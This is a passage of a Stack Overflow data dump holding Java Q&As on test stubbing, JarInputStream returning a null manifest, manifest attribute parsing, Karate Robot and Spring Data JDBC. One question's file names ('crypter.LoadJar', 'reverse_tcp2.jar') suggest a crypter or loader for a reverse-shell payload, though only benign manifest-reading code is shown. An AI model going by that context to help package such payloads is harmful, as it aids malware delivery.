 [TestMethod]\r\n     public void TestProgram(){\r\n      var obj = new Program(new TestDataProvider);\r\n      var result = obj.MethodToTest();\r\n      // asserts\r\n     }\r\n    }","title":"Mock / stub with integration testing in Java","body":"<pre><code>interface IDataProvider {\n string RetrieveData();\n}\n\nclass StandardDataProvider : IDataProvider {\n public string RetrieveData(){\n  // call to API\n }\n}\n\nclass Program {\n private IDataProvider _dataProvider;\n\n public Program(IDataProvider provider = null) {\n  _dataProvider = provider ?? new StandardProvider();\n }\n\n public void MethodToTest(){\n  var data = _dataProvider.RetrieveData();\n  // do your thing\n }\n}\n</code></pre>\n\n<p>In the tests you can mock the data by creating your own <code>IDataProvider</code> object and working with its data.</p>\n\n<pre><code>class TestDataProvider : IDataProvider {\n public string RetrieveData(){\n  return \"my own data\";\n }\n}\n\nclass Test {\n [TestMethod]\n public void TestProgram(){\n  var obj = new Program(new TestDataProvider);\n  var result = obj.MethodToTest();\n  // asserts\n }\n}\n</code></pre>\n"}],"owner":{"account_id":36143,"reputation":740,"user_id":102958,"accept_rate":46,"display_name":"etang"},"comment_count":3,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":1985,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":2,"score":0,"last_activity_date":1639572732,"creation_date":1379647859,"question_id":18908375,"body_markdown":"I&#39;m using rest-assured for integration testing on my endpoints.  One of the endpoints has a dependency to another resource (it calls another API conditionally).  Is there a way for me to stub out the API call so I can write a test for that case?","title":"Mock / stub with integration testing in Java","body":"<p>I'm using rest-assured for integration testing on my endpoints.  One of the endpoints has a dependency to another resource (it calls another API conditionally).  Is there a way for me to stub out the API call so I can write a test for that case?</p>\n"},{"tags":["java","jar","manifest"],"comments":[{"owner":{"account_id":159637,"reputation":2203,"user_id":379173,"display_name":"Enrico Giurin"},"score":0,"creation_date":1483739895,"post_id":41514926,"comment_id":70236086,"body_markdown":"Are you sure there is the resources folder at the folder the java is invoked?","body":"Are you sure there is the resources folder at the folder the java is invoked?"},{"owner":{"account_id":8134250,"reputation":1092,"user_id":6126446,"accept_rate":100,"display_name":"tur11ng"},"score":0,"creation_date":1483740053,"post_id":41514926,"comment_id":70236143,"body_markdown":"@EnricoGiurin Yes, but if something like that happend FileNotFoundException should be thrown. I get none exception of this type","body":"@EnricoGiurin Yes, but if something like that happend FileNotFoundException should be thrown. I get none exception of this type"},{"owner":{"account_id":159637,"reputation":2203,"user_id":379173,"display_name":"Enrico Giurin"},"score":0,"creation_date":1483740472,"post_id":41514926,"comment_id":70236280,"body_markdown":"You are right, just tested","body":"You are right, just tested"},{"owner":{"account_id":8134250,"reputation":1092,"user_id":6126446,"accept_rate":100,"display_name":"tur11ng"},"score":0,"creation_date":1483740527,"post_id":41514926,"comment_id":70236299,"body_markdown":"@EnricoGiurin I am posting the Manifest as well.","body":"@EnricoGiurin I am posting the Manifest as well."},{"owner":{"account_id":159637,"reputation":2203,"user_id":379173,"display_name":"Enrico Giurin"},"score":0,"creation_date":1483740635,"post_id":41514926,"comment_id":70236336,"body_markdown":"Yeah, it would be useful, just tried your code locally with a jar with a valid manifest, and it works","body":"Yeah, it would be useful, just tried your code locally with a jar with a valid manifest, and it works"},{"owner":{"account_id":159637,"reputation":2203,"user_id":379173,"display_name":"Enrico Giurin"},"score":1,"creation_date":1483740888,"post_id":41514926,"comment_id":70236434,"body_markdown":"Very strange, I replaced the MANIFEST.MF with yours and it keeps working :(","body":"Very strange, I replaced the MANIFEST.MF with yours and it keeps working :("},{"owner":{"account_id":8134250,"reputation":1092,"user_id":6126446,"accept_rate":100,"display_name":"tur11ng"},"score":0,"creation_date":1483741069,"post_id":41514926,"comment_id":70236511,"body_markdown":"@EnricoGiurin Thanks for your time. I&#39;m gonna try solve it any way. Maybe it&#39;s something with the jvm or idk. Thanks for your time again!","body":"@EnricoGiurin Thanks for your time. I&#39;m gonna try solve it any way. Maybe it&#39;s something with the jvm or idk. Thanks for your time again!"},{"owner":{"account_id":8134250,"reputation":1092,"user_id":6126446,"accept_rate":100,"display_name":"tur11ng"},"score":1,"creation_date":1483742446,"post_id":41514926,"comment_id":70237037,"body_markdown":"@EnricoGiurin I fixed it by unzipping the jar and zipping it again without changing anything. I generated again the same jar from the generator and it didnt work. My experience cannot find a reason why this is happening.","body":"@EnricoGiurin I fixed it by unzipping the jar and zipping it again without changing anything. I generated again the same jar from the generator and it didnt work. My experience cannot find a reason why this is happening."},{"owner":{"account_id":71739,"reputation":307142,"user_id":207421,"accept_rate":82,"display_name":"user207421"},"score":0,"creation_date":1483743323,"post_id":41514926,"comment_id":70237370,"body_markdown":"Please post a listing of the content of the JAR file using `jar -tvf`. My guess is that the JAR file is being built with backslashes instead of forward slashes. What are those `Name:` entries for?","body":"Please post a listing of the content of the JAR file using <code>jar -tvf</code>. My guess is that the JAR file is being built with backslashes instead of forward slashes. What are those <code>Name:</code> entries for?"},{"owner":{"account_id":8134250,"reputation":1092,"user_id":6126446,"accept_rate":100,"display_name":"tur11ng"},"score":0,"creation_date":1483774606,"post_id":41514926,"comment_id":70244019,"body_markdown":"@EJP I did post it.","body":"@EJP I did post it."},{"owner":{"account_id":71739,"reputation":307142,"user_id":207421,"accept_rate":82,"display_name":"user207421"},"score":0,"creation_date":1483780058,"post_id":41514926,"comment_id":70245275,"body_markdown":"That&#39;s one answer to two questions.","body":"That&#39;s one answer to two questions."},{"owner":{"account_id":8134250,"reputation":1092,"user_id":6126446,"accept_rate":100,"display_name":"tur11ng"},"score":0,"creation_date":1483782418,"post_id":41514926,"comment_id":70245915,"body_markdown":"@EJP I dont know what those name entries stand for. As I previous said the code come from a code generator","body":"@EJP I dont know what those name entries stand for. As I previous said the code come from a code generator"},{"owner":{"account_id":2004750,"reputation":8566,"user_id":1795426,"display_name":"user11153"},"score":0,"creation_date":1639570115,"post_id":41514926,"comment_id":124381080,"body_markdown":"See also: https://stackoverflow.com/questions/4727637/how-do-i-verify-the-order-of-manifest-mf-within-jar","body":"See also: <a href=\"https://stackoverflow.com/questions/4727637/how-do-i-verify-the-order-of-manifest-mf-within-jar\" title=\"how do i verify the order of manifest mf within jar\">stackoverflow.com/questions/4727637/&hellip;</a>"}],"answers":[{"tags":[],"owner":{"account_id":2004750,"reputation":8566,"user_id":1795426,"display_name":"user11153"},"down_vote_count":0,"up_vote_count":3,"is_accepted":true,"score":3,"last_activity_date":1639572317,"creation_date":1639569314,"answer_id":70363276,"question_id":41514926,"body_markdown":"It&#39;s a bug in [`JarInputStream`][1] that `MANIFEST.MF` must be in **the first entries** in a ZIP file, like this:\r\n\r\n    $ jar -tvf example-correct-archive.jar\r\n      623 Thu Jun 13 12:13:42 CEST 2019 META-INF/MANIFEST.MF\r\n        0 Thu Jun 13 12:13:42 CEST 2019 META-INF/\r\n        ...\r\n\r\nIn your case, you have 3 other files before that entries.\r\n\r\n## Workarounds\r\na) Reorder entries in JAR file using `jar` tool:\r\n\r\n - unpack `test.jar` file to directory `foo`\r\n - move existing `MANIFEST.MF` file one level above directory `foo` and remove `META-INF` directory\r\n - inside `foo` directory run command: `jar cvfm ../test.jar ../MANIFEST.MF .`\r\n - outside of `foo` you will get fixed JAR file with correct entries order\r\n\r\n\r\nb) use [`JarFile`][2] instead of `JarInputStream`\r\n\r\n## More info\r\n\r\nSee [JDK-8031748 Clarify jar entry orders in a jar file][3]:\r\n\r\n&gt; From the beginning, the jar file has an “undocumented” assumption that\r\n&gt; the MANIFEST.MF file and signature-related files (block and SF) should\r\n&gt; appear at the beginning (except for directory entries, say,\r\n&gt; META-INF/).\r\n&gt; (...)\r\n\r\n\r\n  [1]: https://docs.oracle.com/javase/8/docs/api/java/util/jar/JarInputStream.html\r\n  [2]: https://docs.oracle.com/javase/8/docs/api/java/util/jar/JarFile.html\r\n  [3]: https://bugs.openjdk.java.net/browse/JDK-8031748","title":"JarInputStream retuns null for existing Manifest file","body":"<p>It's a bug in <a href=\"https://docs.oracle.com/javase/8/docs/api/java/util/jar/JarInputStream.html\" rel=\"nofollow noreferrer\"><code>JarInputStream</code></a> that <code>MANIFEST.MF</code> must be in <strong>the first entries</strong> in a ZIP file, like this:</p>\n<pre><code>$ jar -tvf example-correct-archive.jar\n  623 Thu Jun 13 12:13:42 CEST 2019 META-INF/MANIFEST.MF\n    0 Thu Jun 13 12:13:42 CEST 2019 META-INF/\n    ...\n</code></pre>\n<p>In your case, you have 3 other files before that entries.</p>\n<h2>Workarounds</h2>\n<p>a) Reorder entries in JAR file using <code>jar</code> tool:</p>\n<ul>\n<li>unpack <code>test.jar</code> file to directory <code>foo</code></li>\n<li>move existing <code>MANIFEST.MF</code> file one level above directory <code>foo</code> and remove <code>META-INF</code> directory</li>\n<li>inside <code>foo</code> directory run command: <code>jar cvfm ../test.jar ../MANIFEST.MF .</code></li>\n<li>outside of <code>foo</code> you will get fixed JAR file with correct entries order</li>\n</ul>\n<p>b) use <a href=\"https://docs.oracle.com/javase/8/docs/api/java/util/jar/JarFile.html\" rel=\"nofollow noreferrer\"><code>JarFile</code></a> instead of <code>JarInputStream</code></p>\n<h2>More info</h2>\n<p>See <a href=\"https://bugs.openjdk.java.net/browse/JDK-8031748\" rel=\"nofollow noreferrer\">JDK-8031748 Clarify jar entry orders in a jar file</a>:</p>\n<blockquote>\n<p>From the beginning, the jar file has an “undocumented” assumption that\nthe MANIFEST.MF file and signature-related files (block and SF) should\nappear at the beginning (except for directory entries, say,\nMETA-INF/).\n(...)</p>\n</blockquote>\n"}],"owner":{"account_id":8134250,"reputation":1092,"user_id":6126446,"accept_rate":100,"display_name":"tur11ng"},"comment_count":13,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":907,"favorite_count":0,"down_vote_count":0,"up_vote_count":4,"accepted_answer_id":70363276,"answer_count":1,"score":4,"last_activity_date":1639572317,"creation_date":1483739431,"question_id":41514926,"body_markdown":"I have a problem when using JarInputStream to get the Manifest of a (fully) operating .jar file, I get null pointer. Tried a few bit different files and no exception is thrown. Note : This file comes from a code generator. Has the following structure (hope this shape help you understand it):\r\n\r\n    |[+]test.jar\r\n      |[+]META-INF\r\n          |MANIFEST.MF\r\n      |[+]mypackage\r\n          |MyClass.class\r\n    |text.txt\r\n          \r\nAbove is some part of the class (Note : This class is not located inside the .jar)\r\n\r\n    /*...code...**/\r\n    File jar = new File(&quot;resources/test.jar&quot;);\r\n    FileInputStream fis = new FileInputStream(jar);\r\n    JarInputStream jis = new JarInputStream(fis);\r\n    Manifest jarManifest = jis.getManifest();\r\n    Attributes jarManifestAttributes = jarManifest.getMainAttributes(); //line 25\r\n    String mainClass = jarManifestAttributes.getValue(&quot;Main-Class&quot;);\r\n    /*...code...**/\r\n\r\nWhen running this code above, the below exception is throwed :\r\n   \r\n    Exception in thread &quot;main&quot; java.lang.NullPointerException\r\n\tat crypter.LoadJar.main(LoadJar.java:25)\r\n\r\nSo jarManifest has null value.\r\n\r\n**EDIT1**\r\nMANIFEST.MF\r\n\r\n    Manifest-Version: 1.0\r\n    Main-Class: mypackage.MyClass\r\n    Permissions: all-permissions\r\n    \r\n    Name: text.txt\r\n    \r\n    Name: mypackage/MyClass.class\r\n\r\n\r\n**EDIT2**\r\n\r\n    jar -tvf reverse_tcp2.jar \r\n        37 Sat Jan 07 11:31:14 EET 2017 text.txt\r\n         0 Sat Jan 07 11:31:14 EET 2017 mypackage/\r\n      8513 Sat Jan 07 11:31:14 EET 2017 mypackage/MyClass.class\r\n         0 Sat Jan 07 11:31:14 EET 2017 META-INF/\r\n       145 Sat Jan 07 11:31:14 EET 2017 META-INF/MANIFEST.MF\r\n\r\n","title":"JarInputStream retuns null for existing Manifest file","body":"<p>I have a problem when using JarInputStream to get the Manifest of a (fully) operating .jar file, I get null pointer. Tried a few bit different files and no exception is thrown. Note : This file comes from a code generator. Has the following structure (hope this shape help you understand it):</p>\n\n<pre><code>|[+]test.jar\n  |[+]META-INF\n      |MANIFEST.MF\n  |[+]mypackage\n      |MyClass.class\n|text.txt\n</code></pre>\n\n<p>Above is some part of the class (Note : This class is not located inside the .jar)</p>\n\n<pre><code>/*...code...**/\nFile jar = new File(\"resources/test.jar\");\nFileInputStream fis = new FileInputStream(jar);\nJarInputStream jis = new JarInputStream(fis);\nManifest jarManifest = jis.getManifest();\nAttributes jarManifestAttributes = jarManifest.getMainAttributes(); //line 25\nString mainClass = jarManifestAttributes.getValue(\"Main-Class\");\n/*...code...**/\n</code></pre>\n\n<p>When running this code above, the below exception is throwed :</p>\n\n<pre><code>Exception in thread \"main\" java.lang.NullPointerException\nat crypter.LoadJar.main(LoadJar.java:25)\n</code></pre>\n\n<p>So jarManifest has null value.</p>\n\n<p><strong>EDIT1</strong>\nMANIFEST.MF</p>\n\n<pre><code>Manifest-Version: 1.0\nMain-Class: mypackage.MyClass\nPermissions: all-permissions\n\nName: text.txt\n\nName: mypackage/MyClass.class\n</code></pre>\n\n<p><strong>EDIT2</strong></p>\n\n<pre><code>jar -tvf reverse_tcp2.jar \n    37 Sat Jan 07 11:31:14 EET 2017 text.txt\n     0 Sat Jan 07 11:31:14 EET 2017 mypackage/\n  8513 Sat Jan 07 11:31:14 EET 2017 mypackage/MyClass.class\n     0 Sat Jan 07 11:31:14 EET 2017 META-INF/\n   145 Sat Jan 07 11:31:14 EET 2017 META-INF/MANIFEST.MF\n</code></pre>\n"},{"tags":["java","swing","karate"],"comments":[{"owner":{"account_id":183279,"reputation":168313,"user_id":418556,"accept_rate":98,"display_name":"Andrew Thompson"},"score":0,"creation_date":1628559164,"post_id":68719137,"comment_id":121447597,"body_markdown":"This could be closed on the basis of either Opinion-based *or* Needs more focus. I chose to vote for the latter. Please [edit] the question to remove the first two parts (&#39;opinion based&#39;) and focus only on the 3rd. Comments like *&quot;Appreciate your support, thanks.&quot;* should also be removed. They add no information, are &#39;chatty&#39; &amp; do not increase the chance of getting answers.","body":"This could be closed on the basis of either Opinion-based <i>or</i> Needs more focus. I chose to vote for the latter. Please <a href=\"https://stackoverflow.com/posts/68719137/edit\">edit</a> the question to remove the first two parts (&#39;opinion based&#39;) and focus only on the 3rd. Comments like <i>&quot;Appreciate your support, thanks.&quot;</i> should also be removed. They add no information, are &#39;chatty&#39; &amp; do not increase the chance of getting answers."},{"owner":{"account_id":48302,"reputation":55353,"user_id":143475,"display_name":"Peter Thomas"},"score":0,"creation_date":1628568912,"post_id":68719137,"comment_id":121449020,"body_markdown":"agree with closing as `needs more focus`, added an answer anyway.","body":"agree with closing as <code>needs more focus</code>, added an answer anyway."},{"owner":{"account_id":22420786,"reputation":7,"user_id":16628121,"display_name":"user16628121"},"score":0,"creation_date":1628733550,"post_id":68719137,"comment_id":121502336,"body_markdown":"Thanks @AndrewThompson for the clarification. I&#39;ll make sure to keep that in mind next time i ask a question here.","body":"Thanks @AndrewThompson for the clarification. I&#39;ll make sure to keep that in mind next time i ask a question here."}],"answers":[{"tags":[],"owner":{"account_id":48302,"reputation":55353,"user_id":143475,"display_name":"Peter Thomas"},"down_vote_count":0,"up_vote_count":2,"is_accepted":false,"score":2,"last_activity_date":1628568877,"creation_date":1628568877,"answer_id":68721048,"question_id":68719137,"body_markdown":"Developer of Karate Robot here. Most known users are targeting Windows MFC / C++ / .NET or Delphi so there are no reports of Swing yet, but my guess is that it should work at least on Windows. &quot;inspect.exe&quot; works well to introspect the component tree. And we are looking for contributions for Mac, but there doesn&#39;t seem to be much interest - yet.\r\n\r\nTo summarize, I think your best bet is to contribute code to Karate, and you can make that decision based on your comfort with Java and your evaluation of how good Karate is in its current state and if it will &quot;stay around&quot;, mature into a good desktop testing tool etc.","title":"Using Karate Robot DSL for Windows desktop apps written in Swing and Mac OS support","body":"<p>Developer of Karate Robot here. Most known users are targeting Windows MFC / C++ / .NET or Delphi so there are no reports of Swing yet, but my guess is that it should work at least on Windows. &quot;inspect.exe&quot; works well to introspect the component tree. And we are looking for contributions for Mac, but there doesn't seem to be much interest - yet.</p>\n<p>To summarize, I think your best bet is to contribute code to Karate, and you can make that decision based on your comfort with Java and your evaluation of how good Karate is in its current state and if it will &quot;stay around&quot;, mature into a good desktop testing tool etc.</p>\n"}],"owner":{"account_id":22420786,"reputation":7,"user_id":16628121,"display_name":"user16628121"},"comment_count":3,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":310,"favorite_count":0,"down_vote_count":2,"up_vote_count":1,"closed_date":1628589944,"answer_count":1,"score":-1,"last_activity_date":1639572208,"creation_date":1628547470,"question_id":68719137,"body_markdown":"* For those that have used Karate robot for automating desktop applications in Windows written in Swing I&#39;m curious to know what your experience was like? i.e. were the test runs reliable or flaky? \r\n\r\n* What was the best spy object tool you used to help identify Swing components and feed that to Karate scripts?\r\n\r\n* Also I see that https://github.com/intuit/karate/projects/3 MacOS support is in the backlog, is there any update on whether this update will support Swing apps on MacOS?\r\n\r\nAppreciate your support, thanks.\r\n","title":"Using Karate Robot DSL for Windows desktop apps written in Swing and Mac OS support","body":"<ul>\n<li><p>For those that have used Karate robot for automating desktop applications in Windows written in Swing I'm curious to know what your experience was like? i.e. were the test runs reliable or flaky?</p>\n</li>\n<li><p>What was the best spy object tool you used to help identify Swing components and feed that to Karate scripts?</p>\n</li>\n<li><p>Also I see that <a href=\"https://github.com/intuit/karate/projects/3\" rel=\"nofollow noreferrer\">https://github.com/intuit/karate/projects/3</a> MacOS support is in the backlog, is there any update on whether this update will support Swing apps on MacOS?</p>\n</li>\n</ul>\n<p>Appreciate your support, thanks.</p>\n"},{"tags":["java","attributes","manifest"],"answers":[{"tags":[],"owner":{"account_id":7798259,"reputation":1411,"user_id":5898626,"accept_rate":74,"display_name":"Stepan"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1639569567,"creation_date":1554390718,"answer_id":55519430,"question_id":36529228,"body_markdown":"Oracle managed to break the Manifest class even though it was hard:  \r\n[JDK-8201636 null value when trying to read manifest file attributes][1]\r\n\r\nSee also similar bug for MANIFEST entires:  \r\n[JDK-8031748 Clarify jar entry orders in a jar file][2]:\r\n\r\n&gt; From the beginning, the jar file has an “undocumented” assumption that\r\n&gt; the MANIFEST.MF file and signature-related files (block and SF) should\r\n&gt; appear at the beginning (except for directory entries, say,\r\n&gt; META-INF/).\r\n\r\n\r\n  [1]: https://bugs.openjdk.java.net/browse/JDK-8201636\r\n  [2]: https://bugs.openjdk.java.net/browse/JDK-8031748","title":"MANIFEST.MF Attributes returning null","body":"<p>Oracle managed to break the Manifest class even though it was hard:<br />\n<a href=\"https://bugs.openjdk.java.net/browse/JDK-8201636\" rel=\"nofollow noreferrer\">JDK-8201636 null value when trying to read manifest file attributes</a></p>\n<p>See also similar bug for MANIFEST entires:<br />\n<a href=\"https://bugs.openjdk.java.net/browse/JDK-8031748\" rel=\"nofollow noreferrer\">JDK-8031748 Clarify jar entry orders in a jar file</a>:</p>\n<blockquote>\n<p>From the beginning, the jar file has an “undocumented” assumption that\nthe MANIFEST.MF file and signature-related files (block and SF) should\nappear at the beginning (except for directory entries, say,\nMETA-INF/).</p>\n</blockquote>\n"},{"tags":[],"owner":{"account_id":10192070,"reputation":2256,"user_id":7525132,"display_name":"Izruo"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1639572117,"creation_date":1639572117,"answer_id":70363877,"question_id":36529228,"body_markdown":"The [current answer](https://stackoverflow.com/a/55519430/7525132) is wrong. While the bug reports it mentions are not unrelated, there is a clear error in the code provided in the question. Therefore, it does not provide wrong information, but it indicates a wrong conclusion.\r\n\r\n---\r\n\r\nThe attribute `Implementation-SCM-Revision` is not a main attribute but an attribute of the manifest entry `Build Details`.\r\n\r\nSimplified, a manifest has the following form\r\n\r\n&lt;!-- I know \r\nit&#39;s not YAML, but SO&#39;s syntax highlighting does not support java properties files. --&gt;\r\n```yaml\r\n# fixed\r\nManifest-Version: 1.0\r\n\r\n# Main Attributes\r\nImplementation-Version: 1.0\r\n\r\n# &#39;Name:&#39; marks the beginning of an entry\r\nName: com.example.Foo\r\n# all following lines belong to the previously started entry\r\n# this line therefore applies to com.example.Foo\r\nChecksum: 76652367792347\r\n```\r\n\r\nTherefore, to retrieve the value of `Implementation-SCM-Revision`, one must do\r\n\r\n```\r\nmanifest.getAttributes(&quot;Build Details&quot;).getValue(&quot;Implementation-SCM-Revision&quot;);\r\n```\r\n\r\nThe other way round, in order for `Implementation-SCM-Revision` to be retrieved via `manifest.getMainAttributes()`, it would have to be above `Name:`\r\n\r\n```yaml\r\nManifest-Version: 1.0\r\n# other main attributes\r\nImplementation-SCM-Revision: SomeCommit\r\nName: Build Details\r\n# other entry-related attributes\r\n```\r\n","title":"MANIFEST.MF Attributes returning null","body":"<p>The <a href=\"https://stackoverflow.com/a/55519430/7525132\">current answer</a> is wrong. While the bug reports it mentions are not unrelated, there is a clear error in the code provided in the question. Therefore, it does not provide wrong information, but it indicates a wrong conclusion.</p>\n<hr />\n<p>The attribute <code>Implementation-SCM-Revision</code> is not a main attribute but an attribute of the manifest entry <code>Build Details</code>.</p>\n<p>Simplified, a manifest has the following form</p>\n\n<pre class=\"lang-yaml prettyprint-override\"><code># fixed\nManifest-Version: 1.0\n\n# Main Attributes\nImplementation-Version: 1.0\n\n# 'Name:' marks the beginning of an entry\nName: com.example.Foo\n# all following lines belong to the previously started entry\n# this line therefore applies to com.example.Foo\nChecksum: 76652367792347\n</code></pre>\n<p>Therefore, to retrieve the value of <code>Implementation-SCM-Revision</code>, one must do</p>\n<pre><code>manifest.getAttributes(&quot;Build Details&quot;).getValue(&quot;Implementation-SCM-Revision&quot;);\n</code></pre>\n<p>The other way round, in order for <code>Implementation-SCM-Revision</code> to be retrieved via <code>manifest.getMainAttributes()</code>, it would have to be above <code>Name:</code></p>\n<pre class=\"lang-yaml prettyprint-override\"><code>Manifest-Version: 1.0\n# other main attributes\nImplementation-SCM-Revision: SomeCommit\nName: Build Details\n# other entry-related attributes\n</code></pre>\n"}],"owner":{"display_name":"user6038967"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":1174,"favorite_count":0,"down_vote_count":1,"up_vote_count":4,"answer_count":2,"score":3,"last_activity_date":1639572117,"creation_date":1460288402,"question_id":36529228,"body_markdown":"I&#39;m trying to get a few attributes from a MANIFEST.MF file, but they return null.\r\n\r\n**MANIFEST**\r\n\r\n    Manifest-Version: 1.0\r\n    \r\n    Archiver-Version: Plexus Archiver \r\n    Built-By: jenkins \r\n    Build-Time: 2016-04-09T18:02:46Z Class-Path: spigot-1.8-R0.1-SNAPSHOT.jar Created-By: Apache Maven 3.3.9 \r\n    Build-Jdk: 1.8.0_77\r\n    \r\n    Name: Build Details \r\n    Implementation-SCM-Revision: SomeCommit \r\n    Implementation-Build-Number: SomeBuildNumber \r\n    Implementation-Title: SomeTitle \r\n    Implementation-Version: 4.0.0-SNAPSHOT\r\n\r\n**Code** (This code isn&#39;t the exact code used, but is almost the same)\r\n\r\nFirst try\r\n\r\n     public void doStuff() {\r\n        String version;\r\n        InputStream stream = Main.class.getClassLoader().getResourceAsStream(&quot;META-INF/MANIFEST.MF&quot;);\r\n        Properties properties = new Properties();\r\n\r\n        if (stream != null) {\r\n            try {\r\n                properties.load(stream);\r\n\r\n                version = properties.getProperty(&quot;Implementation-SCM-Revision&quot;); //This is null \r\n            } catch (IOException ex) {\r\n                //TODO handle exception\r\n            }\r\n        }\r\n\r\n\r\nSecond try\r\n\r\n    public void doStuff() {\r\n        Enumeration resEnum;\r\n        try {\r\n            resEnum = Thread.currentThread().getContextClassLoader().getResources(JarFile.MANIFEST_NAME);\r\n            while (resEnum.hasMoreElements()) {\r\n                try {\r\n                    URL url = (URL)resEnum.nextElement();\r\n                    InputStream is = url.openStream();\r\n                    if (is != null) {\r\n                        Manifest manifest = new Manifest(is);\r\n                        Attributes mainAttribs = manifest.getMainAttributes();\r\n                        String version = mainAttribs.getValue(&quot;Implementation-SCM-Revision&quot;); //This is null\r\n                    }\r\n                }\r\n                catch (Exception e) {\r\n                }\r\n            }\r\n        } catch (IOException e1) {\r\n        }\r\n    }\r\n\r\nThe problem is that when all the keys from Attributes#getMainAttributes() get printed, it prints ` [Archiver-Version, Implementation-Title, Sealed, Specification-Version, Implementation-Version, Created-By, Manifest-Version, Build-Jdk, Specification-Vendor, Implementation-Vendor, Ant-Version, Specification-Title, Built-By, Main-Class]`, it excludes the things like `Implementation-SCM-Revision`. That is the one I&#39;m trying to get.\r\n\r\nNo stacktrace is generated, it just prints `null` in the console when printing the `Implementation-SCM-Revision` attribute","title":"MANIFEST.MF Attributes returning null","body":"<p>I'm trying to get a few attributes from a MANIFEST.MF file, but they return null.</p>\n\n<p><strong>MANIFEST</strong></p>\n\n<pre><code>Manifest-Version: 1.0\n\nArchiver-Version: Plexus Archiver \nBuilt-By: jenkins \nBuild-Time: 2016-04-09T18:02:46Z Class-Path: spigot-1.8-R0.1-SNAPSHOT.jar Created-By: Apache Maven 3.3.9 \nBuild-Jdk: 1.8.0_77\n\nName: Build Details \nImplementation-SCM-Revision: SomeCommit \nImplementation-Build-Number: SomeBuildNumber \nImplementation-Title: SomeTitle \nImplementation-Version: 4.0.0-SNAPSHOT\n</code></pre>\n\n<p><strong>Code</strong> (This code isn't the exact code used, but is almost the same)</p>\n\n<p>First try</p>\n\n<pre><code> public void doStuff() {\n    String version;\n    InputStream stream = Main.class.getClassLoader().getResourceAsStream(\"META-INF/MANIFEST.MF\");\n    Properties properties = new Properties();\n\n    if (stream != null) {\n        try {\n            properties.load(stream);\n\n            version = properties.getProperty(\"Implementation-SCM-Revision\"); //This is null \n        } catch (IOException ex) {\n            //TODO handle exception\n        }\n    }\n</code></pre>\n\n<p>Second try</p>\n\n<pre><code>public void doStuff() {\n    Enumeration resEnum;\n    try {\n        resEnum = Thread.currentThread().getContextClassLoader().getResources(JarFile.MANIFEST_NAME);\n        while (resEnum.hasMoreElements()) {\n            try {\n                URL url = (URL)resEnum.nextElement();\n                InputStream is = url.openStream();\n                if (is != null) {\n                    Manifest manifest = new Manifest(is);\n                    Attributes mainAttribs = manifest.getMainAttributes();\n                    String version = mainAttribs.getValue(\"Implementation-SCM-Revision\"); //This is null\n                }\n            }\n            catch (Exception e) {\n            }\n        }\n    } catch (IOException e1) {\n    }\n}\n</code></pre>\n\n<p>The problem is that when all the keys from Attributes#getMainAttributes() get printed, it prints <code>[Archiver-Version, Implementation-Title, Sealed, Specification-Version, Implementation-Version, Created-By, Manifest-Version, Build-Jdk, Specification-Vendor, Implementation-Vendor, Ant-Version, Specification-Title, Built-By, Main-Class]</code>, it excludes the things like <code>Implementation-SCM-Revision</code>. That is the one I'm trying to get.</p>\n\n<p>No stacktrace is generated, it just prints <code>null</code> in the console when printing the <code>Implementation-SCM-Revision</code> attribute</p>\n"},{"tags":["java","spring","spring-data-jdbc"],"answers":[{"tags":[],"owner":{"account_id":25822,"reputation":78747,"user_id":66686,"accept_rate":87,"display_name":"Jens Schauder"},"down_vote_count":0,"up_vote_count":2,"is_accepted":true,"score":2,"last_activity_date":1639572044,"creation_date":1639572044,"answer_id":70363864,"question_id":70302812,"body_markdown":"In your example `AsyncTask` is an aggregate and its own aggregate root.\r\nSo references from one `AsyncTask` to another are considered references between aggregates.\r\n\r\nIn Spring Data JDBC (and also recommended in Domain Driven Design) references to other aggregates are to be implemented as ids, not actual Java references.\r\n\r\nFor the mapping table you need a separate small entity which becomes part of the aggregate on one side of the relationship.\r\n\r\nInstead of just an `Id` you can use an `AggregateReference` in order to avoid having `Long` values all over the place.\r\n\r\nThe complete model could look like this:\r\n\r\n```java\r\n\r\n@Table\r\nclass AsyncTask {\r\n\r\n\t@Id\r\n\tLong id;\r\n\tString name;\r\n\r\n\t@MappedCollection(idColumn = &quot;FROM_ID&quot;)\r\n\tSet&lt;DependentTask&gt; dependents = new HashSet&lt;&gt;();\r\n\r\n\tAsyncTask(String name) {\r\n\t\tthis.name = name;\r\n\t}\r\n\r\n\tpublic void addDependent(AsyncTask task) {\r\n\t\tdependents.add(new DependentTask(task.id));\r\n\t}\r\n}\r\n```\r\n\r\n```java\r\n\r\n@Table\r\nclass DependentTask {\r\n\t@Column(&quot;TO_ID&quot;)\r\n\tAggregateReference&lt;AsyncTask, Long&gt; id; // this is the Id of the dependent task, note that it is not marked with `@Id`\r\n\r\n\tDependentTask(Long id) {\r\n\t\tthis.id = AggregateReference.to(id);\r\n\t}\r\n}\r\n```\r\nAnd be used like this: \r\n```java\r\nAsyncTask one = repo.save(new AsyncTask(&quot;one&quot;));\r\nAsyncTask two = repo.save(new AsyncTask(&quot;two&quot;));\r\n\r\nAsyncTask three = new AsyncTask(&quot;three&quot;);\r\nthree.addDependent(one);\r\nthree.addDependent(two);\r\nrepo.save(three);\r\n\r\none.addDependent(two);\r\nrepo.save(one);\r\n\r\ntwo.addDependent(two);\r\nrepo.save(two);\r\n```\r\n\r\nThe underlying database schema looks like this:\r\n```sql\r\nCREATE TABLE ASYNC_TASK (\r\n    ID INTEGER IDENTITY PRIMARY KEY,\r\n    NAME VARCHAR (200) NOT NULL\r\n);\r\n\r\nCREATE TABLE  DEPENDENT_TASK (\r\n    FROM_ID INTEGER NOT NULL REFERENCES ASYNC_TASK(ID),\r\n    TO_ID INTEGER NOT NULL REFERENCES ASYNC_TASK(ID)\r\n);\r\n```\r\n\r\nThe [complete source code is on GitHub][1].\r\n\r\n\r\nFor more information on the topic read [Spring Data JDBC, References, and Aggregates][2]\r\nand [Spring Data JDBC - How do I make Bidirectional Relationships?][3]\r\n\r\n\r\n  [1]: https://github.com/schauder/stackoverflow/tree/main/jdbc/m-to-m-self-reference\r\n  